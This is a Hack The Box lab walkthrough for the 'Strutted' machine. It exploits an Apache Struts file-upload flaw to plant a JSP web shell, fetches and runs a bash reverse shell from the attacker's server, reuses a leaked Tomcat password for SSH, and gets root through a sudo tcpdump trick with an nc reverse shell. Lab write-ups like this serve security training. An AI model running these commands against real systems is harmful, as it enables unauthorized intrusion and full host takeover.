# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 80 | HTTP |

```
PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
| 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open http syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://strutted.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We need to add `strutted.htb` to `/etc/hosts`

```
echo '10.10.11.59 strutted.htb' | sudo tee -a /etc/hosts 
```


# RECONNAISSANCE
---


![Pasted image 20250325120029.png](../../IMAGES/Pasted%20image%2020250325120029.png)

Let's try exploring the website, for example, we got a `Download` section, if we click it, it downloads this:


![Pasted image 20250325120505.png](../../IMAGES/Pasted%20image%2020250325120505.png)

We get a `.zip` file, let's view its contents:

![Pasted image 20250325120629.png](../../IMAGES/Pasted%20image%2020250325120629.png)

We got a lot of files, let's view the contents of `Dockerfile` for example:

```
cat Dockerfile
FROM --platform=linux/amd64 openjdk:17-jdk-alpine
#FROM openjdk:17-jdk-alpine

RUN apk add --no-cache maven

COPY strutted /tmp/strutted
WORKDIR /tmp/strutted

RUN mvn clean package

FROM tomcat:9.0

RUN rm -rf /usr/local/tomcat/webapps/
RUN mv /usr/local/tomcat/webapps.dist/ /usr/local/tomcat/webapps/
RUN rm -rf /usr/local/tomcat/webapps/ROOT

COPY --from=0 /tmp/strutted/target/strutted-1.0.0.war /usr/local/tomcat/webapps/ROOT.war
COPY ./tomcat-users.xml /usr/local/tomcat/conf/tomcat-users.xml
COPY ./context.xml /usr/local/tomcat/webapps/manager/META-INF/context.xml

EXPOSE 8080

CMD ["catalina.sh", "run"]
```


Server is running `tomcat`, let's keep on investigating this, for example, if we go to `strutted`, we can find a file called `pom.xml`, this file contains the dependencies for the application, let's check it out:

![Pasted image 20250325121543.png](../../IMAGES/Pasted%20image%2020250325121543.png)

For example, this is running `apache struts`, specifically it is running `apache struts 6.3.0.1`, we got a `tomcat-users.xml` file, this reveals the following:

![Pasted image 20250325122403.png](../../IMAGES/Pasted%20image%2020250325122403.png)

We got a plain text password, let's save it for now in case it helps somewhere else.

Let's follow the string of the framework we found, let's try searching for a vulnerability regarding this:

![Pasted image 20250325122545.png](../../IMAGES/Pasted%20image%2020250325122545.png)

We got a File Upload vulnerability, let's read how the vulnerability works:

![Pasted image 20250325122944.png](../../IMAGES/Pasted%20image%2020250325122944.png)


We can find the PoC, let's check it out:

PoC: https://github.com/TAM-K592/CVE-2024-53677-S2-067




# EXPLOITATION
---


After checking the PoC, we can do the following, let's start the exploitation phase, for example, we can modify the `shell.jsp` file with these contents:

```
proxychains python3 S2-067.py -u http://strutted.htb --upload_endpoint /upload.action --files shell.jsp --destination ../../shell.jsp
```


Now, let's start our proxy and check the request:

![Pasted image 20250325124601.png](../../IMAGES/Pasted%20image%2020250325124601.png)

On the reconnaissance, we were able to find the following source codes:


![Pasted image 20250325124709.png](../../IMAGES/Pasted%20image%2020250325124709.png)

This means we need to modify the request in the following way:

![Pasted image 20250325124830.png](../../IMAGES/Pasted%20image%2020250325124830.png)

Let's change the content type and the extension of the file, now, based on the code, we also need to change the magic bytes, let's do it:


![Pasted image 20250325130106.png](../../IMAGES/Pasted%20image%2020250325130106.png)

After changing this, we can see the following:

![Pasted image 20250325130141.png](../../IMAGES/Pasted%20image%2020250325130141.png)

Once we've uploaded it, we can access the file with and test a basic RCE:

```
http://strutted.htb/shell.jsp?action=cmd&cmd=id
```

![Pasted image 20250325142213.png](../../IMAGES/Pasted%20image%2020250325142213.png)

There we go, it worked, we can now send ourselves a shell, we need to do it in the following format:

```
echo -ne '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"' > shell.sh
```


Now, start a python server:

```
python3 -m http.server
```

Next, start a netcat listener on the specified port:

```
nc -lvnp PORT
```

We can now use the following to download the file:

```
http://strutted.htb/shell.jsp?action=cmd&cmd=wget%20http%3A%2F%2FIP%3A8000%2Fshell.sh%20-O%20%2Ftmp%2Fshell.sh
```


It will download the file from our python server, then, we can give it permissions and execute it:

```
http://strutted.htb/shell.jsp?action=cmd&cmd=chmod%20777%20%2Ftmp%2Fshell.sh
```

```
http://strutted.htb/shell.jsp?action=cmd&cmd=/tmp/shell.sh
```


If we check our listener, we can notice we got our connection:

![Pasted image 20250325143143.png](../../IMAGES/Pasted%20image%2020250325143143.png)

Let's begin privilege escalation.


# PRIVILEGE ESCALATION
---

First step would be stabilizing our shell:

1. python3 -c 'import pty;pty.spawn("/bin/bash")'
2. /usr/bin/script -qc /bin/bash /dev/null
3. CTRL + Z
4. stty raw -echo; fg
5. reset xterm
6. export TERM=xterm
7. export BASH=bash

![Pasted image 20250325143331.png](../../IMAGES/Pasted%20image%2020250325143331.png)

Let's start by checking the users:

![Pasted image 20250325144246.png](../../IMAGES/Pasted%20image%2020250325144246.png)

We got an user with a shell: `james`, if we remember the `tomcat-users.xml` file, we got a password in it, let's check the file again:


![Pasted image 20250325144416.png](../../IMAGES/Pasted%20image%2020250325144416.png)

Let's test these credentials in ssh:

```
james:IT14d6SSP81k
```

![Pasted image 20250325144459.png](../../IMAGES/Pasted%20image%2020250325144459.png)

They worked, let's read `user.txt`:

```
james@strutted:~$ cat user.txt
44a90bc1dcd2c965919256669e724c94
```

Now, we can begin by checking our sudo privileges with `sudo -l`:

![Pasted image 20250325144706.png](../../IMAGES/Pasted%20image%2020250325144706.png)

We got sudo privileges on `/usr/sbin/tcpdump`, let's check it out on `gtfobins`:

![Pasted image 20250325144813.png](../../IMAGES/Pasted%20image%2020250325144813.png)

We can do the following to get a reverse shell as root:

```
# Replace IP/PORT with your listener details
COMMAND='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP PORT >/tmp/f'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

Now, let's start a new listener with the specified port, we'll see this:

![Pasted image 20250325145323.png](../../IMAGES/Pasted%20image%2020250325145323.png)

We got the root shell, let's read root flag:

![Pasted image 20250325145422.png](../../IMAGES/Pasted%20image%2020250325145422.png)


```
root@strutted:/home/james# cat /root/root.txt
893db4ca4371dc763f7dc9aa9a709659
```


![Pasted image 20250325145445.png](../../IMAGES/Pasted%20image%2020250325145445.png)

https://www.hackthebox.com/achievement/machine/1872557/644


